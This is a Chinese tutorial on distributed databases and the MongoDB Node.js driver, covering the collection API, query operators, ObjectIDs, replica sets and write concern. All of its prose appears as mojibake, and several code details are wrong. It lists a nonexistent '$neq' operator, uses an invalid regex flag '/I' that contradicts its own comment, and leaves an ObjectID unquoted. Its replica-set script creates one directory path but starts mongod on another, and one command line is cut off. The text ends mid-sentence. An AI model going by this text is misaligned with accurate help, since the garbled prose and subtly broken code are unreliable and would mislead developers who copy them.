åˆ†å¸ƒå¼æ•°æ®åº“ç¨‹åºå¯ä»¥åœ¨åž‚ç›´å’Œæ°´å¹³ä¸¤ä¸ªæ–¹å‘ä¸Šæ‰©å±•ï¼Œåž‚ç›´æ‰©å±•æ˜¯æŒ‡å¢žåŠ æœºå™¨çš„èƒ½åŠ›ï¼Œæ°´å¹³æ‰©å±•æ˜¯å¢žåŠ æœºå™¨çš„æ•°é‡ã€‚åž‚ç›´æ‰©å±•ä¸€èˆ¬ä¼šæ›´ç®€å•ï¼Œä½†å—é™äºŽä¸€å°æœºå™¨æ‰€èƒ½è¾¾åˆ°çš„ç¡¬ä»¶æ°´å¹³ï¼Œè€Œä¸”æˆæœ¬ä¸Šå‡å¾ˆå¿«ã€‚ç›¸å¯¹æ¥è¯´ï¼Œæ°´å¹³æ‰©å±•æ—¶ï¼Œç³»ç»Ÿçš„èƒ½åŠ›æ˜¯éšç€å¤„ç†å™¨å’Œæœºå™¨çš„å¢žåŠ è€Œå¢žé•¿çš„ã€‚å› ä¸ºè¦åè°ƒæ›´å¤šåŠ¨æ€ç»„ä»¶ï¼Œæ‰€ä»¥ä¼šå¢žåŠ å¤æ‚æ€§ã€‚æ‰€æœ‰å¢žåŠ çš„ç³»ç»Ÿæœ€ç»ˆéƒ½ä¼šè¾¾åˆ°ä¸€ä¸ªç‚¹ï¼Œä¹‹åŽåªèƒ½åšæ°´å¹³æ‰©å±•ã€‚ åˆ†å¸ƒå¼æ•°æ®åº“ä»Žä¸€å¼€å§‹å°±æ˜¯æŒ‰ç…§æ°´å¹³æ‰©å±•è®¾è®¡çš„ã€‚æŠŠæ•°æ®å­˜å‚¨åœ¨å¤šå°æœºå™¨ä¸Šè§£å†³äº†å•ç‚¹æ•…éšœé—®é¢˜ï¼Œå¯ä»¥æå‡è€ç”¨æ€§ã€‚å¾ˆå¤šå…³ç³»åž‹ç³»ç»Ÿéƒ½å¯ä»¥ç”¨åˆ†ç‰‡ã€ä¸»/ä»Žã€ä¸»/ä¸»å¤åˆ¶ç­‰å½¢æ€è¿›è¡Œä¸€å®šçš„æ°´å¹³æ‰©å±•ï¼Œä½†ä¸ä¼šè¶…è¿‡å‡ ç™¾ä¸ªèŠ‚ç‚¹ã€‚æ¯”å¦‚ MySQL é›†ç¾¤çš„ä¸Šé™æ˜¯ 255èŠ‚ç‚¹ã€‚è€Œåˆ†å¸ƒå¼æ•°æ®åº“å¯ä»¥æœ‰å‡ åƒä¸ªèŠ‚ç‚¹ã€‚ MongoDBMongoDB æ˜¯é¢å‘å¯¹è±¡çš„åˆ†å¸ƒå¼æ•°æ®åº“ï¼Œä½¿ç”¨å®ƒçš„ Node å¼€å‘äººå‘˜ç‰¹åˆ«å¤šã€‚æ—¶é«¦çš„ MEAN æ ˆä¸­çš„ M å°±æ˜¯ MongoDBï¼ˆå¦å¤–ä¸‰ä¸ªæ˜¯ Expressã€Angular å’Œ Nodeï¼‰ï¼Œä¸€èˆ¬æˆ‘ä»¬åˆšå¼€å§‹æŽ¥è§¦ Node æ—¶é‡åˆ°çš„ç¬¬ä¸€ä¸ªæ•°æ®åº“å°±æ˜¯å®ƒã€‚ MongoDB å—åˆ°çš„æ‰¹è¯„å’Œäº‰è®®éžå¸¸å¤šã€‚å°½ç®¡å¦‚æ­¤ï¼Œå®ƒä»ç„¶æ˜¯å¾ˆå¤šå¼€å‘äººå‘˜çš„ä¸»å­˜å‚¨ã€‚å¾ˆå¤šè‘—åå…¬å¸éƒ½éƒ¨ç½²äº† MongoDBï¼ŒåŒ…æ‹¬ Adobeã€LinkedInã€eBayï¼Œç”šè‡³æ¬§æ´²ç²’å­ç‰©ç†ç ”ç©¶æ‰€ï¼ˆCERNï¼‰çš„å¤§åž‹å¼ºå­å¯¹æ’žæœºç»„ä»¶ä¸Šéƒ½åœ¨ç”¨å®ƒã€‚ MongoDB æ•°æ®åº“æŠŠæ–‡æ¡£å­˜å‚¨åœ¨æ— æ¨¡å¼çš„æ•°æ®é›†ä¸­ã€‚ä¸éœ€è¦é¢„å…ˆä¸ºæ–‡æ¡£å®šä¹‰æ¨¡å¼ï¼ŒåŒä¸€ä¸ªæ•°æ®é›†ä¸­çš„æ–‡æ¡£ä¹Ÿä¸ç”¨éµå¾ªç›¸åŒçš„æ¨¡å¼ã€‚è¿™ç»™äº† MongoDB å¾ˆå¤§çš„çµæ´»æ€§ï¼Œä½†ç¨‹åºè¦å› æ­¤æ‰¿æ‹…èµ·ä¿è¯æ•°æ®ä¸€è‡´æ€§çš„è´£ä»»ï¼Œç¡®ä¿æ–‡æ¡£çš„ç»“æž„æ˜¯å¯é¢„æµ‹çš„ã€‚ å®‰è£…å’Œé…ç½®ä¸åŒç³»ç»Ÿä¸Šçš„ MongoDB å®‰è£…æ˜¯ä¸ä¸€æ ·çš„ã€‚MacOS ä¸Šå°±æ˜¯ç®€å•çš„ï¼š 1brew install mongodb MongoDB æœåŠ¡å™¨æ˜¯ç”¨å¯æ‰§è¡Œæ–‡ä»¶ mongod å¯åŠ¨çš„ï¼š 1mongod --config /usr/local/etc/mongod.conf Christian Amor Kvalheim çš„å®˜æ–¹ mongodb åŒ…æ˜¯æœ€å—æ¬¢è¿Žçš„ MongoDB é©±åŠ¨ï¼š 1npm install mongodb@^2.1.0 --save Windows ç”¨æˆ·æ³¨æ„ä¸€ä¸‹ï¼Œè¿™ä¸ªé©±åŠ¨çš„å®‰è£…éœ€è¦ Microsoft Visual Studio çš„ msbuild.exe 123456const &#123; MongoClient &#125; = require('mongodb');MongoClient.connect('mongodb://localhost:27017/articles') .then(db =&gt; &#123; console.log('Client ready'); db.close(); &#125;, console.error); è¿žæŽ¥æˆåŠŸçš„å¤„ç†å™¨ä¼šå¾—åˆ°ä¸€ä¸ªæ•°æ®åº“å®¢æˆ·ç«¯å®žä¾‹ï¼Œæ‰€æœ‰æ•°æ®åº“å‘½ä»¤éƒ½æ˜¯äº¤ç»™å®ƒæ‰§è¡Œçš„ã€‚ å¤§éƒ¨åˆ†æ•°æ®åº“äº¤äº’éƒ½æ˜¯é€šè¿‡ collection API å®Œæˆçš„ï¼š API è¯´æ˜Ž collection.insert(doc) æ’å…¥ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡æ¡£ collection.find(query) æ‰¾å‡ºè·ŸæŸ¥è¯¢åŒ¹é…çš„æ–‡æ¡£ collection.remove(query) ç§»é™¤è·ŸæŸ¥è¯¢åŒ¹é…çš„æ–‡æ¡£ collection.drop() ç§»é™¤æ•´ä¸ªæ•°æ®é›† collection.update(query) æ›´æ–°è·ŸæŸ¥è¯¢åŒ¹é…çš„æ–‡æ¡£ collection.count(query) å¯¹è·ŸæŸ¥è¯¢åŒ¹é…çš„æ–‡æ¡£è®¡æ•° collection.insertOne(query) æ’å…¥å•ä¸ªæ–‡æ¡£ collection.insertMany([doc1,doc2]) æ’å…¥å¤šä¸ªæ–‡æ¡£ collection.findOne(query) æ‰¾å‡ºä¸€ä¸ªè·ŸæŸ¥è¯¢åŒ¹é…çš„æ–‡æ¡£ collection.updateMany(query) æ›´æ–°æ‰€æœ‰è·ŸæŸ¥è¯¢åŒ¹é…çš„æ–‡æ¡£ æ’å…¥æ–‡æ¡£collection.insertOne å°†å•ä¸ªå¯¹è±¡ä½œä¸ºæ–‡æ¡£å­˜åˆ°æ•°æ®é›†é‡Œï¼ŒæˆåŠŸå¤„ç†å™¨ä¼šå¾—åˆ°ä¸€ä¸ªåŒ…å«æ“ä½œå…ƒä¿¡æ¯çš„å¯¹è±¡ã€‚ 123456789101112131415161718const &#123; MongoClient &#125; = require('mongodb');MongoClient.connect('mongodb://localhost:27017/articles') .then(db =&gt; &#123; console.log('Client ready'); const article = &#123; title: 'I like cake', content: 'It is quite good' &#125;; db.collection('articles') .insertOne(article) .then(result =&gt; &#123; // å¦‚æžœæ–‡æ¡£ä¸­æ²¡æœ‰_id,ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ IDï¼ŒinsertedId å°±æ˜¯é‚£ä¸ªID console.log(result.insertedId); // å®šä¹‰æ–‡æ¡£çš„åŽŸå§‹å¯¹è±¡ä¸­å¢žåŠ äº†ä¸€ä¸ªæ–°å±žæ€§_id console.log(article._id); db.close(); &#125;); &#125;, console.error); insertMany çš„ç”¨æ³•ä¹Ÿå·®ä¸å¤šï¼Œåªæ˜¯å‚æ•°æ˜¯åŒ…å«å¤šä¸ªå¯¹è±¡çš„æ•°ç»„ã€‚insertMany çš„ç»“æžœä¸å†æ˜¯ä¸€ä¸ª insertedIdï¼Œè€Œæ˜¯åŒ…å«å¤šä¸ª ID çš„ insertedIds æ•°ç»„ï¼ŒID çš„é¡ºåºè·Ÿä½œä¸ºå‚æ•°çš„æ•°ç»„ä¸­çš„æ–‡æ¡£é¡ºåºä¸€æ · æŸ¥è¯¢ä»Žæ•°æ®é›†ä¸­è¯»å–æ–‡æ¡£çš„æ–¹æ³•ï¼ˆæ¯”å¦‚ findã€update å’Œ remove ï¼‰éƒ½ä¼šæœ‰ä¸€ä¸ªæŸ¥è¯¢å‚æ•°ï¼Œç”¨æ¥åŒ¹é…æ–‡æ¡£ã€‚æœ€ç®€å•çš„æŸ¥è¯¢å°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒMongoDB ä¼šåŒ¹é…ç»“æž„å’Œå€¼ç›¸åŒçš„æ–‡æ¡£ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªæŸ¥è¯¢ä¼šåŒ¹é…æ‰€æœ‰æ ‡é¢˜ä¸º â€˜I like cakeâ€™ çš„æ–‡æ¡£ã€‚ 1234567db.collection('articles') .find(&#123; title: 'I like cake' &#125;) .toArray() .then(results =&gt; &#123; console.log(results); db.close(); &#125;); æˆ–è€…åŸºäºŽæŸ¥è¯¢æ“ä½œç¬¦åŒ¹é…ï¼š 123db.collection('articles')// æ ‡é¢˜ä»¥â€œcakeâ€ç»“å°¾çš„æ–‡æ¡£ï¼Œå¤§å°å†™æ•æ„Ÿ .find(&#123;title: &#123; $regex: /cake$/I &#125;&#125;) MongoDB æŸ¥è¯¢è¯­è¨€ä¸­çš„æŸ¥è¯¢æ“ä½œç¬¦å¾ˆå¤šï¼Œæ¯”å¦‚ï¼š $eqâ€”â€”ç­‰äºŽæŸä¸ªå€¼ï¼› $neqâ€”â€”ä¸ç­‰äºŽæŸä¸ªå€¼ï¼› $inâ€”â€”åœ¨æ•°ç»„ä¸­ï¼› $ninâ€”â€”ä¸åœ¨æ•°ç»„ä¸­; $ltã€$lteã€$gtã€$gteâ€”â€”å¤§äºŽ/å°äºŽæˆ–ç­‰äºŽæ¯”è¾ƒå€¼ï¼› $nearâ€”â€”åœ°ç†ä½ç½®å€¼åœ¨æŸä¸ªåŒºåŸŸé™„è¿‘ï¼› $notã€$andã€$orã€$norâ€”â€”é€»è¾‘æ“ä½œç¬¦ã€‚ è¿™äº›æ“ä½œç¬¦å‡ ä¹Žå¯ä»¥ç»„åˆå‡ºæ‰€æœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œåˆ›é€ å‡ºå¯è¯»æ€§å¼ºã€ç²¾å·§çš„ã€å¯Œæœ‰è¡¨è¾¾åŠ›çš„æŸ¥è¯¢è¯­å¥ã€‚æ›´å¤šä¸ŽæŸ¥è¯¢å’ŒæŸ¥è¯¢æ“ä½œç¬¦æœ‰å…³çš„å†…å®¹è¯·æµè§ˆ Query and Projection Operators ç½‘ç«™ã€‚ ç”¨ MongoDB å®žçŽ° Article API 1234567891011121314151617181920212223242526const &#123; MongoClient, ObjectID &#125; = require('mongodb');let db;module.exports = () =&gt; &#123; return MongoClient .connect('mongodb://localhost:27017/articles') .then((client) =&gt; &#123; db = client; &#125;);&#125;module.exports.Article = &#123; all() &#123; return db.collection('articles2').find().sort(&#123; title: 1 &#125;).toArray(); &#125;, find(_id) &#123; if (typeof _id !== 'object') _id = ObjectID(_id); return db.collection('articles2').findOne(&#123; _id &#125;); &#125;, create(data) &#123; return db.collection('articles2').insertOne(data, &#123; w: 1 &#125;); &#125;, delete(_id) &#123; if (typeof _id !== 'object') _id = ObjectID(_id); return db.collection('articles2').deleteOne(&#123; _id &#125;, &#123; w: 1 &#125;); &#125;&#125; ç”¨æ³•ç¤ºèŒƒ: è¿žæŽ¥æ•°æ®åº“è¿”å›žçš„ promiseï¼Œç„¶åŽç”¨ Article çš„ create æ–¹æ³•åˆ›å»ºäº†ä¸€ç¯‡æ–‡ç« ã€‚å†åŠ è½½æ‰€æœ‰æ–‡ç« ï¼Œè¾“å‡ºã€‚ 123456789const db = require('./db');db().then(() =&gt; &#123; db.Article.create(&#123; title: 'An title' &#125;).then(() =&gt; &#123; db.Article.all().then(articles =&gt; &#123; console.log(articles); process.exit(); &#125;) &#125;)&#125;); ä½¿ç”¨ MongoDB æ ‡è¯†MongoDB çš„æ ‡è¯†æ˜¯äºŒè¿›åˆ¶ JSON ï¼ˆBSONï¼‰æ ¼å¼çš„ã€‚æ–‡æ¡£ä¸Šçš„ _id æ˜¯ä¸€ä¸ª JavaScript å¯¹è±¡ï¼Œå…¶å†…éƒ¨å°è£…äº† BSON æ ¼å¼çš„ objectIDã€‚BSON æ ¼å¼æ˜¯æ–‡æ¡£åœ¨ MongoDB å†…éƒ¨çš„è¡¨ç¤ºå’Œä¼ è¾“æ ¼å¼ï¼Œå®ƒæ¯” JSON çš„ç©ºé—´åˆ©ç”¨çŽ‡é«˜ï¼Œè§£æžé€Ÿåº¦å¿«ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥ç”¨æ›´ä½Žçš„å¸¦å®½è¾¾æˆæ›´å¿«çš„æ•°æ®åº“äº¤äº’ã€‚ BSON æ ¼å¼çš„ ObjectID å¹¶ä¸æ˜¯éšæœºçš„å­—èŠ‚åºåˆ—ï¼Œå®ƒç¼–ç äº†ID ä½•æ—¶åœ¨ä½•å¤„ç”Ÿæˆçš„å…ƒæ•°æ®ã€‚æ¯”å¦‚ ObjectID çš„å‰å››ä¸ªå­—èŠ‚ï¼Œå®ƒä»¬æ˜¯æ—¶é—´æˆ³ã€‚å› æ­¤æ–‡æ¡£ä¸­æ²¡æœ‰å¿…è¦å†å•ç‹¬ä¿å­˜ä¸€ä¸ª createdAt æ—¶é—´æˆ³ï¼š 123const id = new ObjectID(61bd7f57bf1532835dd6174b); // getTimestamp è¿”å›ž JavaScript æ—¥æœŸï¼š 2016-07-08T14:49:05.000Zid.getTimestamp(); ObjectID æ ¼å¼çš„æ›´å¤šä¿¡æ¯ åœ¨ç»ˆç«¯è¾“å‡ºæ˜¯ï¼ŒObjectID è¡¨é¢ä¸Šçœ‹èµ·æ¥å¯èƒ½åƒå­—ç¬¦ä¸²ä¸€æ ·ï¼Œä½†å®žé™…ä¸Šæ˜¯å¯¹è±¡ã€‚æ‰€ä»¥åœ¨è¿›è¡Œæ¯”è¾ƒï¼Œè§£é‡Šå™¨ä¼šæŠ¥å‘Šè¯´ä¸¤ä¸ªçœ‹èµ·æ¥å®Œå…¨ä¸€æ ·çš„å€¼æ˜¯ä¸åŒçš„ï¼Œå› ä¸ºå®ƒä»¬æ˜¯æŒ‡å‘ä¸åŒå¯¹è±¡çš„å¼•ç”¨å€¼ã€‚è¿™å°±æ˜¯å…¸åž‹çš„å¯¹è±¡æ¯”è¾ƒé™·é˜±ã€‚ ä¸‹é¢çš„ä»£ç ä¸¤æ¬¡æå–ç›¸åŒçš„å¯¹è±¡ã€‚æˆ‘ä»¬è¯•å›¾ç”¨ Node è‡ªå¸¦çš„ assert æ¨¡æ¿æ–­è¨€è¿™ä¸¤ä¸ª ID æˆ–è€…è¯´å¯¹è±¡æ˜¯ç›¸å¯¹çš„ï¼Œç»“æžœå´å¤±è´¥äº†ï¼š 1234567891011121314const &#123; MongoClient &#125; = require('mongodb');const assert = require('assert')MongoClient.connect('mongodb://localhost:27017/articles') .then(db =&gt; &#123; console.log('Client ready'); const Articles = db.collection('articles') Articles.find().toArray().then(articles =&gt; &#123; const article1 = articles[0]; return Articles.findOne().then(article2 =&gt; &#123; assert.equal(article1._id, article2._id); db.close(); &#125;) &#125;) &#125;) ObjectID æœ‰ä¸ª equal æ–¹æ³•ï¼Œæ‰€æœ‰çš„ _id éƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•åˆ¤æ–­å®ƒä»¬æ˜¯å¦ç›¸ç­‰ã€‚å¦å¤–ï¼Œä½ ä¹Ÿå¯ä»¥å°†æ ‡è¯†å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œæˆ–è€…ç”¨ assert æ¨¡å—çš„ deepEquals æ–¹æ³• 123article1._id.equals(article2._id); String(article1._id) === String(article2._id); assert.deepEqual(article1._id, article2._id); ä¼ ç»™ mongodb é©±åŠ¨çš„æ ‡è¯†å¿…é¡»æ˜¯ BSON æ ¼å¼çš„ ObjectIDã€‚ObjectID æž„é€ å™¨å¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢æˆ ObjectIDï¼š 123const &#123; ObjectID &#125; = require('mongodb'); const stringID = '577f6b45549a3b991e1c3c18'; const bsonID = new ObjectID(stringID); è¦å°½å¯èƒ½ä¿æŒ BSON æ ¼å¼ã€‚åœ¨ BSON å’Œå­—ç¬¦ä¸²ä¹‹é—´çš„ç›¸äº’è½¬æ¢ä¼šä»¥ç‰ºç‰²æ€§èƒ½ä¸ºä»£ä»·ï¼Œè¿™è¿èƒŒäº† MongoDB æŠŠ BSON æ ¼å¼çš„æ ‡è¯†äº¤ç»™å®¢æˆ·ç«¯çš„åˆè¡·ã€‚è¯·å‚é˜… BSON å®˜ç½‘äº†è§£ BSON æ ¼å¼çš„è¯¦ç»†ä¿¡æ¯ã€‚ ä½¿ç”¨å¤åˆ¶é›†MongoDB çš„åˆ†å¸ƒå¼åŠŸèƒ½ï¼Œå¤šä¸ª mongod è¿›ç¨‹å¯ä»¥ä½œä¸ºå¤åˆ¶é›†çš„èŠ‚ç‚¹/æˆå‘˜è¿è¡Œã€‚å¤åˆ¶é›†æ˜¯ç”±ä¸€ä¸ªä¸»èŠ‚ç‚¹å’Œæ— æ•°ä»ŽèŠ‚ç‚¹ç»„æˆçš„ã€‚å¤åˆ¶é›†ä¸­çš„æ¯ä¸ªæˆå‘˜éƒ½ä¼šåˆ†åˆ°å”¯ä¸€çš„ç«¯å£å’Œç›®å½•å­˜å‚¨è‡ªå·±çš„æ•°æ®ã€‚å„ä¸ªå®žä¾‹ä¸èƒ½å…±äº«ç«¯å£å’Œç›®å½•ï¼Œå¹¶ä¸”åœ¨å¯åŠ¨ä¹‹å‰è¿™äº›ç›®å½•å¿…é¡»æ˜¯å·²ç»å­˜åœ¨äº†ã€‚ ä¸‹é¢ä»£ç ä¸ºæ¯ä¸ªæˆå‘˜åˆ›å»ºå”¯ä¸€çš„ç›®å½•ï¼Œå¹¶ä»Žç«¯å£ 27017 å¼€å§‹æŒ‰é¡ºåºå¯åŠ¨å®ƒä»¬ã€‚å¦‚æžœä¸æƒ³è®© mongod åœ¨åŽå°è¿è¡Œï¼ˆå‘½ä»¤ä¸­ä¸å¸¦ &amp;ï¼‰ï¼Œå¯ä»¥ä¸ºæ¯ä¸ª mongod å‘½ä»¤å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯æ ‡ç­¾ã€‚ å¯åŠ¨ä¸€ä¸ªå¤åˆ¶é›† 12345678mkdir -p ./mongodata/db0 ./mongodata/db1 ./mongodata/db2 // ç¡®ä¿æ²¡æœ‰å…¶ä»– mongod å®žä¾‹è¿è¡Œpkill mongod// è®©å·²æœ‰å®žä¾‹æœ‰æ—¶é—´å…³åœsleep 3mongod --port 27017 --dbpath ./rs0-data/db0 --replSet rs0 &amp; mongod --port 27018 --dbpath ./rs0-data/db1 --replSet rs0 &amp; m å¤åˆ¶é›†è·‘èµ·æ¥ä¹‹åŽï¼ŒMongoDB éœ€è¦æ‰§è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œã€‚ä½ éœ€è¦è¿žæŽ¥åˆ°å¸Œæœ›è®©å®ƒåšä¸»èŠ‚ç‚¹çš„é‚£ä¸ªå®žä¾‹ï¼ˆé»˜è®¤æ˜¯ 27017ï¼‰ï¼Œå¹¶åƒä¸‹é¢è¿™æ ·è°ƒç”¨ rs.initiate()ã€‚ç„¶åŽæŠŠè¿™äº›å®žä¾‹ä½œä¸ºæˆå‘˜æ·»åŠ åˆ°å¤åˆ¶é›†ä¸­ã€‚æ³¨æ„è¦æä¾›æ‰€è¿žæœºå™¨çš„ä¸»æœºåã€‚ 1234mongo --eval "rs.initiate()" mongo --eval "rs.add('`hostname`:27017')"mongo --eval "rs.add('`hostname`:27018')" mongo --eval "rs.add('`hostname`:27019')" åœ¨å»ºç«‹è¿žæŽ¥æ—¶ï¼ŒMongoDB å®¢æˆ·ç«¯éœ€è¦çŸ¥é“æ‰€æœ‰çš„å¤åˆ¶é›†æˆå‘˜ï¼Œä½†å¹¶ä¸è¦æ±‚æ‰€æœ‰æˆå‘˜éƒ½åœ¨çº¿ã€‚è¿žä¸Šä¹‹åŽå°±å¯ä»¥ç…§å¸¸ä½¿ç”¨äº†ã€‚ åˆ›å»ºå¤åˆ¶é›† 1234567891011121314151617const os = require('os'); const &#123; MongoClient &#125; = require('mongodb'); const hostname = os.hostname(); const members = [ `$&#123;hostname&#125;:27018`, `$&#123;hostname&#125;:27017`, `$&#123;hostname&#125;:27019` ]; // test æ˜¯æ•°æ®åº“åï¼›rs0æ˜¯å¤åˆ¶é›†çš„åç§°MongoClient.connect(`mongodb://$&#123;members.join(',')&#125;/test?replSet=rs0`).then(db =&gt; &#123; // replSetGetStatusä¼šè¾“å‡ºå¤åˆ¶é›†çš„æˆå‘˜ä¿¡æ¯å’Œå…ƒæ•°æ® db.admin().replSetGetStatus().then(status =&gt; &#123; console.log(status); db.close(); &#125;); &#125;); å³ä¾¿æœ‰èŠ‚ç‚¹å´©æºƒï¼Œä½†åªè¦ä»åœ¨è¿è¡Œçš„ mongod èŠ‚ç‚¹ä¸å°‘äºŽä¸¤ä¸ªï¼Œç³»ç»Ÿå°±èƒ½ç»§ç»­å·¥ä½œã€‚å¦‚æžœä¸»èŠ‚ç‚¹å´©æºƒäº†ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æŽ¨ä¸¾ä¸€ä¸ªä»ŽèŠ‚ç‚¹å‡ä¸ºä¸»èŠ‚ç‚¹ã€‚ äº†è§£å†™å…³æ³¨åœ¨ä½¿ç”¨ MongoDB æ—¶ï¼Œå¼€å‘äººå‘˜èƒ½å¤Ÿå¯¹æ€§èƒ½å’Œå®‰å…¨ä¸Šçš„æŠ˜ä¸­é€‰é¡¹åšç²¾ç»†çš„æŽ§åˆ¶ï¼Œä»¥æ»¡è¶³ç¨‹åºä¸åŒåŒºåŸŸçš„éœ€è¦ã€‚è¦æƒ³ä¸å‡ºæ„å¤–ï¼Œå¿…é¡»æŽŒæ¡ MongoDB çš„å†™å…³æ³¨å’Œè¯»å…³æ³¨è¿™ä¸¤ä¸ªæ¦‚å¿µï¼Œç‰¹åˆ«æ˜¯åœ¨å¤åˆ¶é›†ä¸­çš„èŠ‚ç‚¹ä¸æ–­å¢žå¤šæ—¶ã€‚ å†™å…³æ³¨æœ¬è´¨ä¸Šæ˜¯ä¸ªæ•°é‡å€¼ï¼Œè¡¨æ˜Ž MongoDB åœ¨è¿”å›žæ“ä½œæ•´ä½“æˆåŠŸçš„å“åº”ä¹‹å‰ï¼Œéœ€è¦æŠŠæ•°æ®æˆåŠŸå†™å…¥å¤šå°‘ä¸ª mongod å®žä¾‹ã€‚å¦‚æžœä¸ç‰¹åˆ«æŒ‡æ˜Žï¼Œå†™å…³æ³¨çš„é»˜è®¤å€¼æ˜¯ 1ï¼Œå³ç¡®ä¿æ•°æ®æˆåŠŸå†™å…¥è‡³å°‘ä¸€ä¸ªèŠ‚ç‚¹ã€‚å¯¹äºŽé‡è¦æ•°æ®è€Œè¨€ï¼Œè¿™æ ·çš„ä¿è¯æ°´å¹³æ˜¯ä¸å¤Ÿçš„ã€‚å¦‚æžœåœ¨æ•°æ®å¤åˆ¶åˆ°å…¶ä»–èŠ‚ç‚¹ä¹‹å‰ï¼Œè¿™ä¸ªèŠ‚ç‚¹ä¸‹çº¿äº†ï¼Œé‚£æ•°æ®å¯èƒ½å°±ä¸¢äº†ã€‚ ä»Žç¨‹åºè§’åº¦æ¥è¯´ï¼Œå®žé™…ä¸Šæ˜¯ç»å¸¸å¸Œæœ›æŠŠå†™å…³æ³¨è®¾ä¸º0ï¼Œå³ç¨‹åºæ ¹æœ¬ä¸æƒ³ä¸º MongoDB çš„å“åº”è€Œç­‰å¾…ï¼š 1db.collection('data').insertOne(data,&#123;w:0&#125;); å†™å…³æ³¨ä¸º0æ—¶æ€§èƒ½æ°´å¹³è¾¾åˆ°æœ€é«˜ï¼Œä½†åŒæ—¶è€ç”¨æ€§ä¿è¯é™åˆ°æœ€ä½Žï¼Œä¸€èˆ¬åªåœ¨ä¸´æ—¶æˆ–ä¸é‡è¦çš„æ•°æ®ä¸Šä½¿ç”¨ï¼ˆæ¯”å¦‚å†™æ—¥å¿—æˆ–ç¼“å­˜ï¼‰ åœ¨è¿žåˆ°å¤åˆ¶é›†ä¸Šæ—¶ï¼Œå†™å…³æ³¨å¯ä»¥å¤§äºŽ1ï¼ŒæŠŠæ•°æ®å¤åˆ¶åˆ°æ›´å¤šèŠ‚ç‚¹ä¸Šå¯ä»¥é™ä½Žå…¶ä¸¢å¤±çš„é£Žé™©ï¼Œä½†ä»£ä»·æ˜¯æ“ä½œå»¶æ—¶ä¼šæ›´é•¿ 12db.collection('data').insertOne(data,&#123;w:2&#125;);db.collection('data').insertOne(data,&#123;w:5&#125;); å†™å…³æ³¨ä¹Ÿå¯ä»¥éšç€é›†ç¾¤ä¸­èŠ‚ç‚¹æ•°é‡çš„å˜åŒ–è€Œå˜åŒ–ï¼Œå½“å†™å…³æ³¨è¢«è®¾ä¸º majority æ—¶ï¼ŒMongoDB èƒ½è‡ªè¡ŒåŠ¨æ€è°ƒæ•´å®ƒçš„å€¼ã€‚æ­¤æ—¶æ•°æ®ä¸€å®šä¼šå†™å…¥è‡³å°‘ 50% çš„å¯ç”¨èŠ‚ç‚¹ï¼š 1db.collection('data').insertOne(data,&#123;w:'majority'&#125;); é»˜è®¤å€¼çš„å†™å…³æ³¨1å¯èƒ½æ— æ³•ä¿è¯é‡è¦æ•°æ®çš„å®‰å…¨ã€‚å¦‚æžœåœ¨æ•°æ®å¤åˆ¶åˆ°å…¶ä»–èŠ‚ç‚¹ä¹‹å‰ï¼Œè¿™ä¸ªèŠ‚ç‚¹ä¸‹çº¿äº†ï¼Œé‚£æ•°æ®å¯èƒ½å°±ä¸¢äº†ã€‚ å†™å…³æ³¨å¤§äºŽ1æ—¶ï¼Œå¯ä»¥ç¡®ä¿åœ¨ç»§ç»­æ“ä½œä¹‹å‰æ•°æ®ä¼šå†™å…¥å¤šä¸ª mongodb å®žä¾‹ä¸Šã€‚åœ¨åŒä¸€å°æœºå™¨ä¸Šè¿è¡Œå¤šä¸ªå®žä¾‹ç¡®å®žå¯ä»¥æé«˜æ•°æ®çš„å®‰å…¨æ€§ï¼Œä½†å‡ºçŽ°ç³»ç»Ÿæ€§æ•…éšœæ—¶ï¼Œæ¯”å¦‚ç¡¬ç›˜ç©ºé—´æˆ–RAM è€—å…‰äº†ï¼Œè¿™æ ·çš„é…ç½®æ˜¯æ— æµŽäºŽäº‹çš„ã€‚å¦‚æžœæŠŠèŠ‚ç‚¹åˆ†å¸ƒåœ¨å¤šå°æœºå™¨ä¸Šï¼Œå¹¶ç¡®ä¿å†™å…¥æ“ä½œä¼šä¼ æ’­åˆ°è¿™äº›èŠ‚ç‚¹ä¸Šæ—¶ï¼Œå¯ä»¥ä¿è¯æ•°æ®ä¸å—æœºå™¨æ•…éšœçš„å½±å“ï¼Œä½†åŒæ ·ï¼Œæ•´ä¸ªæ•°æ®ä¸­å¿ƒéƒ½å‡ºçŽ°é—®é¢˜å°±ä¸è¡Œäº†ï¼Œå¹¶ä¸”å†™æ“ä½œä¼šæ›´æ…¢ã€‚æŠŠèŠ‚ç‚¹éƒ¨åˆ†åˆ°å¤šä¸ªæ•°æ®ä¸­å¿ƒå¯ä»¥ä¿è¯æ•°æ®ä¸å—æ•°æ®ä¸­å¿ƒçº§æ•…éšœçš„å½±å“ï¼Œä½†å°†æ•°æ®å¤åˆ¶åˆ°å¤šä¸ªæ•°æ®ä¸­å¿ƒæ€§èƒ½å½±å“éžå¸¸å¤§ã€‚ ä¿éšœè¶Šå¤šï¼Œç³»ç»Ÿè¶Šæ…¢ï¼Œä¹Ÿè¶Šå¤æ‚ã€‚ä¸ä»… MongoDB å¦‚æ­¤ï¼Œæ‰€æœ‰æ•°æ®å­˜å‚¨éƒ½è¿™æ ·ã€‚æ²¡æœ‰å®Œç¾Žçš„è§£å†³æ–¹æ¡ˆï¼Œä½ éœ€è¦å†³å®šå°†ç¨‹åºå„éƒ¨åˆ†çš„é£Žé™©æ°´å¹³æŽ§åˆ¶åœ¨ä»€ä¹ˆèŒƒå›´å†… é”®/å€¼å­˜å‚¨é”®/å€¼å­˜å‚¨ä¸­çš„æ‰€æœ‰è®°å½•éƒ½æ˜¯ç”±ä¸€ä¸ªé”®å€¼å¯¹æž„æˆçš„ã€‚å¤§å¤šæ•°é”®/å€¼ 